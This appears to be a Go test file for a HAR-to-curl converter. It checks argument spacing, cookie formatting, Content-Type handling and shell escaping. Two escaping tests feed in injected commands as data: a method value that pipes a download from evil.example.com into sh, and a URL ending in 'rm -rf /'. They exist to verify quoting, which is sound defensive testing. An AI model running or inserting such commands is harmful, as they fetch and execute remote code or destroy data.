package hargo

import (
	"regexp"
	"strings"
	"testing"
)

// Regression: -b and -H each appended a trailing space and -d relied on that, so
// an entry with a body and no other flags produced "curl -X POST-d ...", which
// curl reads as the method "POST-d".
//
// The original tests missed this because they asserted with
// strings.Contains(got, "-d '...'"), and "POST-d '...'" contains that substring.
// These assertions are anchored on the flag boundary instead.
func TestFromEntryAlwaysSeparatesArguments(t *testing.T) {
	tests := []struct {
		name  string
		entry func() Entry
	}{
		{
			name: "body only, no cookies and no headers",
			entry: func() Entry {
				e := Entry{}
				e.Request.Method = "POST"
				e.Request.URL = "http://example.com/a"
				e.Request.PostData.Text = `{"k":"v"}`
				return e
			},
		},
		{
			name: "body with HTTP/1.0",
			entry: func() Entry {
				e := Entry{}
				e.Request.Method = "POST"
				e.Request.HTTPVersion = "HTTP/1.0"
				e.Request.URL = "http://example.com/a"
				e.Request.PostData.Text = "x=1"
				return e
			},
		},
		{
			name: "body with cookies",
			entry: func() Entry {
				e := Entry{}
				e.Request.Method = "PUT"
				e.Request.URL = "http://example.com/a"
				e.Request.Cookies = []Cookie{{Name: "s", Value: "1"}}
				e.Request.PostData.Text = "x=1"
				return e
			},
		},
		{
			name: "no body at all",
			entry: func() Entry {
				e := Entry{}
				e.Request.Method = "GET"
				e.Request.URL = "http://example.com/a"
				return e
			},
		},
	}

	// Every argument must be preceded by whitespace: no two arguments may abut.
	glued := regexp.MustCompile(`[^\s](-X|-b|-H|-d|-0)\b`)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := fromEntry(tt.entry())
			t.Logf("got: %s", got)

			if m := glued.FindString(got); m != "" {
				t.Errorf("arguments are glued together at %q in %q", m, got)
			}
			// The method must stand alone as its own argument.
			fields := strings.Fields(got)
			for i, f := range fields {
				if f == "-X" {
					if i+1 >= len(fields) {
						t.Fatalf("-X has no value in %q", got)
					}
					method := strings.Trim(fields[i+1], "'")
					if strings.ContainsAny(method, "-") {
						t.Errorf("method argument %q absorbed a following flag", fields[i+1])
					}
				}
			}
		})
	}
}

// The output must be usable as a shell command, so every value a HAR controls has
// to be quoted, including the method.
func TestFromEntryEscapesMethod(t *testing.T) {
	e := Entry{}
	e.Request.Method = "GET; curl http://evil.example.com/x | sh #"
	e.Request.URL = "http://example.com/a"

	got := fromEntry(e)
	t.Logf("got: %s", got)

	// The injected command must not appear as bare, executable shell.
	if strings.Contains(got, "; curl http://evil.example.com/x | sh") &&
		!strings.Contains(got, `'GET; curl http://evil.example.com/x | sh #'`) {
		t.Errorf("method was not shell-escaped: %q", got)
	}
}

func TestFromEntryEscapesURL(t *testing.T) {
	e := Entry{}
	e.Request.Method = "GET"
	e.Request.URL = "http://example.com/a?x=1&y=2; rm -rf /"

	got := fromEntry(e)
	t.Logf("got: %s", got)

	if strings.HasSuffix(got, "; rm -rf /") {
		t.Errorf("URL was not shell-escaped: %q", got)
	}
}

// Regression: cookies were joined with "&", so a server parsing the Cookie header
// saw one cookie named "a" with value "1&b=2". RFC 6265 separates pairs with "; ".
func TestFromEntryUsesRFC6265CookieSeparator(t *testing.T) {
	e := Entry{}
	e.Request.Method = "GET"
	e.Request.URL = "http://example.com/a"
	e.Request.Cookies = []Cookie{
		{Name: "a", Value: "1"},
		{Name: "b", Value: "2"},
		{Name: "c", Value: "3"},
	}

	got := fromEntry(e)
	t.Logf("got: %s", got)

	if strings.Contains(got, "a=1&b=2") {
		t.Errorf("cookies joined with &, want \"; \": %q", got)
	}
	if !strings.Contains(got, "-b 'a=1; b=2; c=3'") {
		t.Errorf("got %q, want -b 'a=1; b=2; c=3'", got)
	}
}

// Regression: cookie names and values were URL-encoded, which turns a space into
// "+" and percent-encodes octets that are legal in a cookie. The browser recorded
// what it sent, so that is what should be emitted.
func TestFromEntryDoesNotURLEncodeCookies(t *testing.T) {
	e := Entry{}
	e.Request.Method = "GET"
	e.Request.URL = "http://example.com/a"
	e.Request.Cookies = []Cookie{
		{Name: "json", Value: `{"a":1}`},
		{Name: "b64", Value: "YWJjZA=="},
	}

	got := fromEntry(e)
	t.Logf("got: %s", got)

	for _, bad := range []string{"%7B", "%22", "%3D", "+"} {
		if strings.Contains(got, bad) {
			t.Errorf("cookie value was URL-encoded (found %q) in %q", bad, got)
		}
	}
	if !strings.Contains(got, `{"a":1}`) {
		t.Errorf("got %q, want the recorded JSON cookie value verbatim", got)
	}
	if !strings.Contains(got, "YWJjZA==") {
		t.Errorf("got %q, want the recorded base64 padding preserved", got)
	}
}

// A body needs a Content-Type or the server cannot interpret it; browsers record
// the type on postData rather than always duplicating it as a header.
func TestFromEntryDerivesContentTypeFromPostData(t *testing.T) {
	e := Entry{}
	e.Request.Method = "POST"
	e.Request.URL = "http://example.com/a"
	e.Request.PostData.MimeType = "application/json"
	e.Request.PostData.Text = `{"k":"v"}`

	got := fromEntry(e)
	t.Logf("got: %s", got)

	if !strings.Contains(got, "-H 'Content-Type: application/json'") {
		t.Errorf("got %q, want a Content-Type derived from postData.mimeType", got)
	}
}

// A recorded Content-Type header must not be duplicated.
func TestFromEntryDoesNotDuplicateContentType(t *testing.T) {
	e := Entry{}
	e.Request.Method = "POST"
	e.Request.URL = "http://example.com/a"
	e.Request.Headers = []NVP{{Name: "Content-Type", Value: "application/json"}}
	e.Request.PostData.MimeType = "application/json"
	e.Request.PostData.Text = `{"k":"v"}`

	got := fromEntry(e)
	t.Logf("got: %s", got)

	if n := strings.Count(got, "Content-Type"); n != 1 {
		t.Errorf("Content-Type appears %d times in %q, want 1", n, got)
	}
}

// Every entry in a real fixture must produce a command whose arguments are all
// separated, as a guard against the class of bug above.
func TestToCurlRealFixtureHasNoGluedArguments(t *testing.T) {
	got, err := ToCurl(openFixture(t, "testdata/golang.org.har"))
	if err != nil {
		t.Fatalf("ToCurl() error = %v", err)
	}

	glued := regexp.MustCompile(`[^\s](-X|-b|-H|-d|-0)\b`)
	for i, line := range strings.Split(got, "\n") {
		if line == "" {
			continue
		}
		if m := glued.FindString(line); m != "" {
			t.Errorf("line %d has glued arguments at %q: %s", i, m, line)
		}
		if !strings.HasPrefix(line, "curl -X ") {
			t.Errorf("line %d does not start with \"curl -X \": %s", i, line)
		}
	}
}
